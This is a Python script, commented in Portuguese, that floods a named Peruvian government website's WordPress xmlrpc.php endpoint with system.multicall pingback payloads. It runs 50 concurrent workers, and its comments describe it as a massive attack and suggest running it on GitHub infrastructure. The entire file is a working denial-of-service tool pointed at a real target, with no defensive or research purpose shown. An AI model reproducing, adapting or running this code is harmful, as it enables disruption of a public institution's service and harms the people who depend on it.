import asyncio
import aiohttp
import random
import string
import time

# CONFIGURAÇÃO DE PODER
TARGET = "https://ugelch.gob.pe/xmlrpc.php" # Mude para /wp-login.php se preferir login
WORKERS = 50  # Quantidade de conexões simultâneas (aumenta isso para mais força)
DURATION = 300 # Duração em segundos (máximo seguro para GitHub é ~6 horas)

def rand_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def xml_flood(session, semaphore, start_time):
    while time.time() - start_time < DURATION:
        async with semaphore:
            try:
                # Payload XML-RPC massivo
                calls = []
                for _ in range(20):
                    calls.append(f"""<value><struct>
                        <member><name>methodName</name><value><string>pingback.ping</string></value></member>
                        <member><name>params</name><value><array><data>
                        <value><string>http://{rand_string(10)}.com/p={random.randint(1,999)}</string></value>
                        <value><string>http://{rand_string(10)}.com</string></value>
                        </data></array></value></member>
                    </struct></value>""")
                
                body = f"""<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>
{''.join(calls)}
</data></array></value></param></params>
</methodCall>"""

                headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'text/xml'}
                
                # Usamos timeout curto para não travar o worker
                async with session.post(TARGET, data=body.encode(), headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    await resp.read() # Consume a resposta rapidamente
                    
            except Exception:
                pass

async def main():
    print(f"[!] Ataque Massivo iniciado em {TARGET}")
    print(f"[+] Workers: {WORKERS} | Duração: {DURATION}s")
    
    # Configuração TCP agressiva
    connector = aiohttp.TCPConnector(limit=WORKERS, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        semaphore = asyncio.Semaphore(WORKERS)
        tasks = [asyncio.create_task(xml_flood(session, semaphore, time.time())) for _ in range(WORKERS)]
        
        # Mantém os workers rodando
        await asyncio.gather(*tasks)
        
    print("[+] Fim do ataque.")

if __name__ == "__main__":
    asyncio.run(main())